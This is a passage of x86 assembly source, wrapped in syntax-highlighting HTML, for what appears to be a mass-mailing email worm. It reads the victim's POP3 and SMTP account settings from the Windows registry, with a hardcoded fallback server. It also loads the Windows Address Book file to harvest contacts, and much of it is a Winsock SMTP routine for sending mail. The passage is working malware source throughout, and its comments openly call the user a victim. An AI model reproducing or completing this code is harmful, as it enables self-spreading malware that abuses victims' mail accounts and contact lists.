</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">user_pop3_server</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pop3_account_value</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">           </span><span class="sc1">;get pop3 server</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg_query_size2</span><span class="sc4">],</span><span class="sc2">30</span><span class="sc0"> 

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_query_size2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">user_smtp_address</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp_user_address</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg_query_size2</span><span class="sc4">],</span><span class="sc2">30</span><span class="sc0">  </span><span class="sc1">;get victim mail address    </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_query_size2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">user_pop3_name</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pop3_user_value</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg_query_size2</span><span class="sc4">],</span><span class="sc2">30</span><span class="sc0">  </span><span class="sc1">;get victim user name</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_query_size2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">user_smtp_server</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">default_mail_account2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg_query_size2</span><span class="sc4">],</span><span class="sc2">30</span><span class="sc0">  </span><span class="sc1">;get the users smtp server</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">user_smtp_server</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">closereg_and_exit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">user_smtp_server</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">smtpaddress_offset</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;take this smtp server for sending mails</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">closereg_and_exit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">

</span><span class="sc5">take_default_settings</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hardcode_server</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">smtpaddress_offset</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;when there isnt a smtp server, take a</span><span class="sc0">
                                </span><span class="sc1">;hardcoded one  </span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SearchWAB</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">phk_result2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_wab_address</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">          </span><span class="sc1">;is there a reg key for the wab location?</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wab_file_error</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_query_size3</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wab_file_name</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">           </span><span class="sc1">;get the path of the wab file</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">phk_result2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wab_file_name</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wab_file_error</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wab_file_name</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">            </span><span class="sc1">;open the wab file</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffffffh</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wab_file_error</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">            </span><span class="sc1">;get the size of thi phile</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">filemaphandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">filemaphandle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">          </span><span class="sc1">;Make a file mapping</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc0">            </span><span class="sc1">;Locate some mem </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wab_in_memory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy mapped file to mem </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filemaphandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">            </span><span class="sc1">;Close file mapping</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wab_in_memory</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Give address of file in mem to eax</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">wab_file_error</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SendMail</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sendmailto_offset</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mail_mode</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; The two Parameters are stored</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsadata</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0101h</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WSAStartup</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_possible</span><span class="sc0">            </span><span class="sc1">;Load Winsock</span><span class="sc0">

</span><span class="sc5">open_new_socket</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc0">             </span><span class="sc1">;Create a socket</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">release_library</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">socket_descriptor</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">got_smtp_server</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">smtpaddress_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">try_another_mailserver</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">smtp_ip</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sockaddr_in.sin_family</span><span class="sc4">,</span><span class="sc5">AF_INET</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sockaddr_in.sin_addr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000019h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">htons</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sockaddr_in.sin_port</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000010h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">socket_descriptor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">try_another_mailserver</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0000c000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_socket</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">freemem_offset</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">send_data</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_from_socket</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">try_another_mailserver</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">smtpaddress_offset</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hardcode_server</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">another_helo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_helo</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">try_another_mailserver</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">llll</span><span class="sc0">

</span><span class="sc5">another_helo</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_helo2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">try_another_mailserver</span><span class="sc0">

</span><span class="sc5">llll</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_from_socket</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">smtpaddress_offset</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hardcode_server</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">another_mailfrom</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_mailfrom</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">qqqq</span><span class="sc0">

</span><span class="sc5">another_mailfrom</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_mailfrom2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">

</span><span class="sc5">qqqq</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_from_socket</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">correct_command</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">lets_send_mail</span><span class="sc0">

</span><span class="sc5">try_another_mailserver</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">smtpaddress_offset</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hardcode_server</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_socket</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">socket_descriptor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc0">
